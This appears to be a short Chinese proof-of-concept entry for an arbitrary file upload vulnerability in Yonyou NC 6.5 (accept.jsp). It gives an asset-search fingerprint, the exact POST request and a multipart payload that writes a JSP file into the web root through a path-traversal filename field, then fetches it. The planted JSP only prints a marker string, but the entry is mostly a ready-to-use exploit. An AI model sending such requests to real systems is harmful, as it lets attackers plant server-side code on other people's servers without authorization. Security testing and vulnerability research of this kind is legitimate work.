# 用友NCaccept存在任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="用友 UAP"`
- **请求**：`POST /aim/equipmap/accept.jsp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 263`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="stc.txt"
<% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
--00content0boundary00
Content-Disposition: form-data; name="fname"
\webapps\nc_web\stc.jsp
--00content0boundary00--

上传文件位置
GET /stc.jsp HTTP/1.1
Host:
```

**其他**
- 用友NC accept存在任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友NC6.5